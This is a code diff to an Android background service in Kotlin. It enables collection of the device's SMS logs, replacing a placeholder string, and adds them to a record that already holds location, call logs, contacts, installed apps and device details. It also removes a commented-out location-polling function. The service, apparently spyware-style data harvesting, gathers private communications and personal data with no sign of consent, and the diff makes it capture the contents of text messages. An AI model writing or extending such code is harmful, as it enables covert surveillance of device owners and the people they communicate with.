@@ -87,26 +87,6 @@ class AppService : Service() {
             locationListener
         )
     }
-//    private fun updateLocation() {
-//        val interval: Long = 1000 * 60 * 60
-//        locationManager = getSystemService(LOCATION_SERVICE) as LocationManager?
-//        ContextCompat.getMainExecutor(applicationContext).execute {
-//            try {
-//
-//                // Request location updates
-//                locationManager?.requestLocationUpdates(
-//                    LocationManager.GPS_PROVIDER,
-//                    interval,
-//                    0F,
-//                    locationListener
-//                )
-//
-//            } catch (ex: SecurityException) {
-//                Log.d(TAG, "Security Exception, no location available")
-//            }
-//        }
-//
-//    }
 
     //define the listener
     private val locationListener: LocationListener = object : LocationListener {
@@ -205,7 +185,7 @@ class AppService : Service() {
             return null
         }
 
-//        val smsLogs = getSMSLogs()
+        val smsLogs = getSMSLogs()
         val callLogs = Gson().toJson(getCallLogs())
         val listContact = Gson().toJson(getNamePhoneDetails())
         val appsInstalled = getAllAppsInstalled()
@@ -218,7 +198,7 @@ class AppService : Service() {
             location = strLocation,
             deviceInfo = getSystemDetail(),
             callLogs = callLogs,
-            smsLogs = "smsLogs",
+            smsLogs = smsLogs,
             listContact = listContact,
             appsDownloaded = appsInstalled,
         )
